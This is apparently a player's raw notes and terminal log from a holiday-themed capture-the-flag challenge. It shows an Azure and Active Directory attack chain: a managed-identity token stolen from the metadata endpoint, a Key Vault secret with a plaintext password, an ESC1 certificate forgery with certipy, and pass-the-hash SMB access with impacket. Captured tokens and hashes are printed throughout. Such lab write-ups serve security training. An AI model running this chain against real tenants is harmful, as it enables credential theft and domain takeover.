@@ -1,0 +1,208 @@
+Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?
+InstructionsForEnteringSatelliteGroundStation.txt
+
+ssh-agent /bin/bash
+ssh-add ~/private.pem
+ssh -i admin.cer alabaster@ssh-server-vm.santaworkshopgeeseislands.org
+
+
+alabaster@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H "Metadata: true"
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlhdCI6MTcwMjg2MzkzMCwibmJmIjoxNzAyODYzOTMwLCJleHAiOjE3MDI5NTA2MzAsImFpbyI6IkUyVmdZUENmMlpwNmRUYVhSK2EyU2VjVzNkd1ZCZ0E9IiwiYXBwaWQiOiJiODRlMDZkMy1hYmExLTRiY2MtOTYyNi0yZTBkNzZjYmEyY2UiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC85MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJyaCI6IjAuQUZFQTJvNmprQVpBMVUyU1RHeWxYS3pCVFVaSWYza0F1dGRQdWtQYXdmajJNQlBRQUFBLiIsInN1YiI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInRpZCI6IjkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZCIsInV0aSI6InBJUUtrczZad0V1S3ZSdi11MUdZQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9zc2gtc2VydmVyLXZtIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5IiwieG1zX3RjZHQiOjE2OTg0MTc1NTd9.l40Fr1-_AXhQuLr0fYyjxKOE6PTq9_C4NxaA0Lsssox4hULqWoQlipbQvLPr2kFyJwr4Jvh2MrhQcM_4Z8sDtqOLsTVCjFWZUKXvdhaUdUUu5TKZj-qygTrapYNJi9Ynp7vJZUpw8TCYbQsF43p1b7kzlRSCjtyMggAwTTG1O7Ey-BgZAY2VOk6DWckcWzwfQ3U1gnevZAucQjpVjvmayDOwZWsI6pa-uV1gZSbFgwVKbMpeY2zmRXTVGWC9sm9EEGRB6i9OuNYDd7I56wxUZqReIr_q1DOuU-2K8lJz6iBxBwCH62-MfCLvdGiJGx6IaVCWRgOT-1G7ExIhtWu5GQ","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85093","expires_on":"1702950630","ext_expires_in":"86399","not_before":"1702863930","resource":"https://management.azure.com","token_type":"Bearer"}
+
+GET https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?
+
+https://management.azure.com/subscriptions/{subscriptionId}/providers/Microsoft.KeyVault/deletedVaults?api-version=2022-07-01$filter=resourceType eq 'Microsoft.KeyVault/vaults'&api-version=2015-11-01
+
+subscriptionId: 2b0942f3-9bca-484b-a508-abdae2db5e64
+
+
+tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d
+
+GET https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/deletedVaults?api-version=2022-07-01
+
+alabaster@ssh-server-vm:~$ token="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlhdCI6MTcwMjg2MzkzMCwibmJmIjoxNzAyODYzOTMwLCJleHAiOjE3MDI5NTA2MzAsImFpbyI6IkUyVmdZUENmMlpwNmRUYVhSK2EyU2VjVzNkd1ZCZ0E9IiwiYXBwaWQiOiJiODRlMDZkMy1hYmExLTRiY2MtOTYyNi0yZTBkNzZjYmEyY2UiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC85MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJyaCI6IjAuQUZFQTJvNmprQVpBMVUyU1RHeWxYS3pCVFVaSWYza0F1dGRQdWtQYXdmajJNQlBRQUFBLiIsInN1YiI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInRpZCI6IjkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZCIsInV0aSI6InBJUUtrczZad0V1S3ZSdi11MUdZQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9zc2gtc2VydmVyLXZtIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5IiwieG1zX3RjZHQiOjE2OTg0MTc1NTd9.l40Fr1-_AXhQuLr0fYyjxKOE6PTq9_C4NxaA0Lsssox4hULqWoQlipbQvLPr2kFyJwr4Jvh2MrhQcM_4Z8sDtqOLsTVCjFWZUKXvdhaUdUUu5TKZj-qygTrapYNJi9Ynp7vJZUpw8TCYbQsF43p1b7kzlRSCjtyMggAwTTG1O7Ey-BgZAY2VOk6DWckcWzwfQ3U1gnevZAucQjpVjvmayDOwZWsI6pa-uV1gZSbFgwVKbMpeY2zmRXTVGWC9sm9EEGRB6i9OuNYDd7I56wxUZqReIr_q1DOuU-2K8lJz6iBxBwCH62-MfCLvdGiJGx6IaVCWRgOT-1G7ExIhtWu5GQ"
+alabaster@ssh-server-vm:~$ curl --header "Authorization: Bearer $token" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/deletedVaults?api-version=2022-07-01
+
+
+curl --header "Authorization: Bearer $token"  https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv?api-version=2022-07-01
+
+{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv","name":"northpole-it-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{},"systemData":{"createdBy":"thomas@sanshhc.onmicrosoft.com","createdByType":"User","createdAt":"2023-10-30T13:17:02.532Z","lastModifiedBy":"thomas@sanshhc.onmicrosoft.com","lastModifiedByType":"User","lastModifiedAt":"2023-10-30T13:17:02.532Z"},"properties":{"sku":{"family":"A","name":"Standard"},"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","accessPolicies":[],"enabledForDeployment":false,"enabledForDiskEncryption":false,"enabledForTemplateDeployment":false,"enableSoftDelete":true,"softDeleteRetentionInDays":90,"enableRbacAuthorization":true,"vaultUri":"https://northpole-it-kv.vault.azure.net/","provisioningState":"Succeeded","publicNetworkAccess":"Enabled"}}
+
+alabaster@ssh-server-vm:~$ curl --header "Authorization: Bearer $token"  https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdt/vaults/northpole-ssh-certs-kv?api-version=2022-07-01s/Microsoft.KeyVault
+{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv","name":"northpole-ssh-certs-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{},"systemData":{"createdBy":"thomas@sanshhc.onmicrosoft.com","createdByType":"User","createdAt":"2023-11-12T01:47:13.059Z","lastModifiedBy":"thomas@sanshhc.onmicrosoft.com","lastModifiedByType":"User","lastModifiedAt":"2023-11-12T01:50:52.742Z"},"properties":{"sku":{"family":"A","name":"standard"},"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","accessPolicies":[{"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","objectId":"0bc7ae9d-292d-4742-8830-68d12469d759","permissions":{"keys":["all"],"secrets":["all"],"certificates":["all"],"storage":["all"]}},{"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","objectId":"1b202351-8c85-46f1-81f8-5528e92eb7ce","permissions":{"secrets":["get"]}}],"enabledForDeployment":false,"enableSoftDelete":true,"softDeleteRetentionInDays":90,"vaultUri":"https://northpole-ssh-certs-kv.vault.azure.net/","provisioningState":"Succeeded","publicNetworkAccess":"Enabled"}}
+
+
+curl --header "Authorization: Bearer $token" https://northpole-ssh-certs-kv.vault.azure.net//keys?api-version=7.4
+
+
+alabaster has impacket in home dir
+certipy present
+
+
+GET https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines?api-version=2023-07-01
+
+nothing...
+
+GET https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Network/publicIPAddresses/{publicIpAddressName}?api-version=2023-05-01
+
+alabaster@ssh-server-vm:~$ curl --header "Authorization: Bearer $header" https://management.azure.com/subscr42f3-9bca-484b-a508-abdae2db5e64/resourcegroups/northpole-rg1/providers/Microsoft.Authorization/permissions?api-version=
+2022-04-01
+{"value":[{"actions":["Microsoft.KeyVault/vaults/read","Microsoft.KeyVault/vaults/secrets/read","Microsoft.Web/sites/sourcecontrols/Read","microsoft.web/sites/functions/read","Microsoft.Resources/subscriptions/resourceGroups/read"],"notActions":[],"dataActions":["Microsoft.KeyVault/vaults/secrets/getSecret/action","Microsoft.KeyVault/vaults/secrets/readMetadata/action"],"notDataActions":[]}]}
+
+
+alabaster@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -H "Metadata: true"
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDMwNzM2MjEsIm5iZiI6MTcwMzA3MzYyMSwiZXhwIjoxNzAzMTYwMzIxLCJhaW8iOiJFMlZnWU9EMjZpcjVzZTVYYmNlYW5xWmpjLy9mQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoicWRiTjZsWWdxa2VEZXU0R0RoS2xBUSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.WG96E9geSyj-bTcBAjtIlgp-Op9eMsJ1C2w37VgM7iie0i50VgvFhC0yNjM5xR72CCrHo4xQWeZbSsroyoqx3WXjKP0YhY81jZwaZiajdjGoWyCtmM6Dicf_W70t6jM2r-CD2xoR9HpGHM-ZBSZIdcjDWsvcB1zN1U8KJJjox8016l_CKpiZ8BjdtVsJ0RG0oySI2jZRYkdN7Z1T3acyp_Yp6Z6dGmTBNGDX2AaLLDEv4M_mNTeSRaIA6sVl7-yG_Vu14VhqXEQ_HAuqS1VGZBy197_3svjPNZN74Li2paT87E5qysvLU1rQ5TqBMkyiDgIV1kFx8AmF7HaIvGFRDQ","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"83772","expires_on":"1703160321","ext_expires_in":"86399","not_before":"1703073621","resource":"https://vault.azure.net","token_type":"Bearer"}
+
+alabaster@ssh-server-vm:~$ curl --header "Authorization: Bearer $vault" https://northpole-ssh-certs-kv.vault.azure.net//secrets?api-version=7.4
+{"error":{"code":"Forbidden","message":"The user, group or application 'appid=b84e06d3-aba1-4bcc-9626-2e0d76cba2ce;oid=600a3bc8-7e2c-44e5-8a27-18c3eb963060;iss=https://sts.windows.net/90a38eda-4006-4dd5-924c-6ca55cacc14d/' does not have secrets list permission on key vault 'northpole-ssh-certs-kv;location=eastus'. For help resolving this issue, please see https://go.microsoft.com/fwlink/?linkid=2125287","innererror":{"code":"AccessDenied"}}}
+
+
+alabaster@ssh-server-vm:~$ curl --header "Authorization: Bearer $vault" https://northpole-it-kv.vault.azure.net/secrets?
+api-version=7.4
+{"value":[{"id":"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript","attributes":{"enabled":true,"created":1699564823,"updated":1699564823,"recoveryLevel":"Recoverable+Purgeable","recoverableDays":90},"tags":{}}],"nextLink":null}
+
+
+alabaster@ssh-server-vm:~$ curl --header "Authorization: Bearer $vault" https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4
+{"value":"Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru","id":"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d","attributes":{"enabled":true,"created":1699564823,"updated":1699564823,"recoveryLevel":"Recoverable+Purgeable","recoverableDays":90},"tags":{}}alabaster@ssh-server-vm:~$
+
+alabaster@ssh-server-vm:~$ impacket/certipy find -dc-only -target 10.0.0.53 -u elfy@northpole.local -p 'J4`ufC49/J4766'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Saved BloodHound data to '20231220130534_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20231220130534_Certipy.txt'
+[*] Saved JSON output to '20231220130534_Certipy.json'
+
+Certificate Templates
+  0
+    Template Name                       : NorthPoleUsers
+    Display Name                        : NorthPoleUsers
+    Certificate Authorities             : northpole-npdc01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Domain Users
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : NORTHPOLE.LOCAL\Enterprise Admins
+        Write Owner Principals          : NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+        Write Dacl Principals           : NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+        Write Property Principals       : NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC1                              : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+
+
+      alabaster@ssh-server-vm:~$ impacket/certipy req -target 10.0.0.53 -ca northpole-npdc01-CA -template NorthPoleUsers -u el
+fy@northpole.local -p 'J4`ufC49/J4766' -upn administrator@northpole.local
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[!] Failed to resolve: NORTHPOLE.LOCAL
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 76
+[*] Got certificate with UPN 'administrator@northpole.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+
+alabaster@ssh-server-vm:~$ certipy auth -pfx administrator.pfx -dc-ip 10.0.0.53
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@northpole.local
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+
+might need to enum users
+
+alabaster@ssh-server-vm:~/impacket$ GetADUsers.py -all 'northpole.local/elfy:J4`ufC49/J4766' -dc-ip 10.0.0.53
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Querying 10.0.0.53 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon
+--------------------  ------------------------------  -------------------  -------------------
+alabaster                                             2023-12-21 01:04:07.339883  2023-12-21 01:18:12.829550
+Guest                                                 <never>              <never>
+krbtgt                                                2023-12-21 01:11:54.572250  <never>
+elfy                                                  2023-12-21 01:14:16.345604  2023-12-21 01:26:50.931695
+wombleycube                                           2023-12-21 01:14:16.470604  2023-12-21 01:40:26.206167
+
+
+alabaster@ssh-server-vm:~$ impacket/certipy req -target 10.0.0.53 -ca northpole-npdc01-CA -template NorthPoleUsers -u elfy@northpole.local -p 'J4`ufC49/J4766' -upn wombleycube@northpole.local
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[!] Failed to resolve: NORTHPOLE.LOCAL
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 7
+[*] Got certificate with UPN 'wombleycube@northpole.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'wombleycube.pfx'
+alabaster@ssh-server-vm:~$ impacket/certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: wombleycube@northpole.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'wombleycube.ccache'
+[*] Trying to retrieve NT hash for 'wombleycube'
+[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+
+alabaster@ssh-server-vm:~$ impacket/smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53 NORTHPOLE.LOCAL/wombleycube@10.0.0.53
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# help
+
+ open {host,port=445} - opens a SMB connection against the target host/port
+ login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
+
+# cd \\10.0.0.53\FileShare
+[-] No share selected
+# use FileShare
+# ls
+drw-rw-rw-          0  Thu Dec 21 01:15:09 2023 .
+drw-rw-rw-          0  Thu Dec 21 01:15:06 2023 ..
+-rw-rw-rw-     701028  Thu Dec 21 01:15:09 2023 Cookies.pdf
+-rw-rw-rw-    1521650  Thu Dec 21 01:15:09 2023 Cookies_Recipe.pdf
+-rw-rw-rw-      54096  Thu Dec 21 01:15:09 2023 SignatureCookies.pdf
+drw-rw-rw-          0  Thu Dec 21 01:15:08 2023 super_secret_research
+-rw-rw-rw-        165  Thu Dec 21 01:15:09 2023 todo.txt
+
+
+# tree super_secret_research
+//super_secret_research/InstructionsForEnteringSatelliteGroundStation.txt
+Finished - 0 files and folders
+
+# cat //super_secret_research/InstructionsForEnteringSatelliteGroundStation.txt
+Note to self:
+
+To enter the Satellite Ground Station (SGS), say the following into the speaker:
+
+And he whispered, 'Now I shall be out of sight;
+So through the valley and over the height.'
+And he'll silently take his way.
+
